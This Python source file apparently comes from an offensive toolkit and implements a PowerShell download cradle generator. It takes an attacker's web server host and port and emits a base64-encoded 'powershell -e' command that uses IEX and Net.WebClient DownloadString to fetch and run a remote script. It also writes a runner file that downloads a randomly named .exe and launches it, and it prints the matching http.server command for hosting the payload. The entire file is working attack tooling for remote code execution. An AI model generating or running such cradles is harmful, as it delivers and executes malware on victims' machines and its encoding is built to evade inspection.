import base64
from config.colours import success, error, info, process, console
import random
import string


def pshell_cradle():
    """
    Powershell Cradle Generator
    :return:
    """

    web_server_ip = console.input(
        "[blue bold] [i] Web Server Listening Host: ")
    web_server_port = console.input(
        "[blue bold] [i] Web Server Listening Port: ")
    payload_name = console.input("[blue bold] [i]  Payload Name: ")
    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    randomised_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    randomised_exe_file = f"{randomised_exe_file}.exe"
    info(f"Run this command to start a web server\npython3 -m http.server -b {web_server_ip} {web_server_port}")

    runner_cal_unencoded = f"iex (New-Object Net.WebClient).DownloadString('http://{web_server_ip}:{web_server_port}/{payload_name}')".encode(
        'utf-16le')
    with open(runner_file, 'w') as f:
        f.write(
            f'powershell -c wget http://{web_server_ip}:{web_server_port}/{randomised_exe_file} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
        f.close()
    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
    b64_runner_cal = b64_runner_cal.decode()

    success(f"\nEncoded Payload\n\npowershell -e {b64_runner_cal}")
    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
    success(f"\nUnencoded Payload\n\n{b64_runner_cal_decoded}")
